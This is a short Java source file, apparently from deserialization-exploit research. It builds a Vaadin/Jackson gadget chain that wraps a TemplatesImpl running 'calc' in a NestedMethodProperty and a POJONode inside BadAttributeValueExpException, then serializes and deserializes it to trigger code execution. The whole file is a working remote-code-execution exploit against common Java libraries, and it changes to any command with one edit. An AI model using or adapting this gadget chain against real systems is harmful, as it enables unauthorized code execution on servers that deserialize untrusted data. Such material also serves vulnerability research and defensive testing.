package Seri;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.vaadin.data.util.NestedMethodProperty;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class VaadinGadgets {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        NestedMethodProperty nestedMethodProperty = new NestedMethodProperty<>(templates ,"OutputProperties");
        POJONode pojoNode = new POJONode(nestedMethodProperty);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Utils.setValue(bad, "val", pojoNode);

//        Utils.serialize(bad ,"bin/vaadin.bin");
        Utils.unserialize("bin/vaadin.bin");
    }
}
